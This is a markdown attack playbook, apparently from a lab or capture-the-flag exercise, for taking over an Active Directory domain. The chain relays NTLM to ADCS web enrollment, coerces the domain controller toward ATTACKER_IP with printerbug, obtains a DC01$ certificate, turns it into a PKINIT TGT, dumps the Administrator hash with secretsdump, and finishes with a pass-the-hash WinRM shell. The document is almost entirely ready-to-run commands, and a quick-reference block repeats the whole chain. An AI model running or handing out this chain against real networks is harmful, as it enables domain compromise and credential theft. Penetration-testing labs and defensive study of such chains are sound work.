# ADCS Relay → Machine Cert → PKINIT TGT → DC Compromise

**Scenario:** Active Directory Certificate Services (ADCS) misconfigurations allow NTLM relay to request machine certificates. With these, we obtain Kerberos TGTs (via PKINIT) and escalate to Domain Admin.

---

## Flow
1) **Run ntlmrelayx** against ADCS web enrollment (`certsrv`).  
2) **Trigger coercion** (printerbug, PetitPotam, etc.) from DC to attacker → relay to ADCS.  
3) **Obtain .pfx cert** for `DC01$`.  
4) **Use PKINITtools** → `gettgtpkinit.py` → craft Kerberos TGT.  
5) **Export ccach** → confirm ticket with `klist`.  
6) **Use secretsdump with -k -no-pass** to dump Administrator hash.  
7) **Evil-WinRM** with PTH to fully compromise.  

References: impacket-ntlmrelayx, printerbug.py, PKINITtools, oscrypto, secretsdump, evil-winrm. 

---

## Setup & OPSEC
- Ensure no local conflicts on ports 80/445/88.  
- Work from venv for PKINITtools.  
- Have a staging dir `/loot/adcs`.  

---

## NTLM Relay → ADCS Enrollment
### ntlmrelayx with ADCS support
```bash
sudo impacket-ntlmrelayx -t http://TARGET/certsrv/certfnsh.asp \
  --adcs -smb2support --template KerberosAuthentication
```
This sets up SMB + HTTP listeners and targets the ADCS web endpoint.

### Coerce DC Authentication
```bash
# Grab coercion script
wget https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/printerbug.py

# Trigger auth from DC01
python3 printerbug.py DOMAIN/user:pass@DC01_IP ATTACKER_IP
```
If successful, `ntlmrelayx` issues a certificate and drops `DC01$.pfx`.

---

## Convert Certificate → Kerberos TGT
### PKINITtools
```bash
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv && source .venv/bin/activate
pip3 install -r requirements.txt
pip3 install -I git+https://github.com/wbond/oscrypto.git
```

### Request TGT
```bash
python3 gettgtpkinit.py -cert-pfx ../DC01$.pfx \
  -dc-ip DC01_IP 'domain.local/dc01$' /tmp/dc.ccache
```
This generates a valid Kerberos TGT and saves it.

---

## Kerberos Environment Setup
### Export Ticket
```bash
export KRB5CCNAME=/tmp/dc.ccache
klist
```
Expect to see `krbtgt/domain.local`. 

### Kerberos Packages
```bash
sudo apt-get install krb5-user -y
echo "DC01_IP dc01.domain.local" | sudo tee -a /etc/hosts
sudo nano /etc/krb5.conf
# set default_realm = DOMAIN.LOCAL and kdc = dc01.domain.local
```

---

## Exploitation
### Dump Administrator Hash
```bash
impacket-secretsdump -k -no-pass -dc-ip DC01_IP \
  -just-dc-user Administrator 'DOMAIN/DC01$'@DC01.DOMAIN.LOCAL
```
Example output shows Administrator NTLM hash.

### Pass-the-Hash  WinRM
```bash
evil-winrm -i dc01.domain.local -u Administrator -H <NTLM_HASH>
```
Shell as Domain Admin.

### Grab Flag
```powershell
type C:\Users\Administrator\Desktop\flag.txt
```

---

## Quick Reference
```bash
# Relay setup
impacket-ntlmrelayx -t http://DC/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication

# Coercion
python3 printerbug.py DOMAIN/user:pass@DC_IP ATTACKER_IP

# PKINIT
python3 gettgtpkinit.py -cert-pfx ../DC01$.pfx -dc-ip DC_IP 'domain.local/dc01$' /tmp/dc.ccache
export KRB5CCNAME=/tmp/dc.ccache
klist

# Dump secrets
impacket-secretsdump -k -no-pass -dc-ip DC_IP -just-dc-user Administrator 'DOMAIN/DC01$'@DC01.DOMAIN.LOCAL

# WinRM
evil-winrm -i dc01.domain.local -u Administrator -H <NTLM_HASH>
```

---

## Tool Links
- impacket-ntlmrelayx — https://github.com/fortra/impacket  
- printerbug — https://github.com/dirkjanm/krbrelayx  
- PKINITtools — https://github.com/dirkjanm/PKINITtools  
- oscrypto fix — https://github.com/wbond/oscrypto  
- evil-winrm — https://github.com/Hackplayers/evil-winrm  
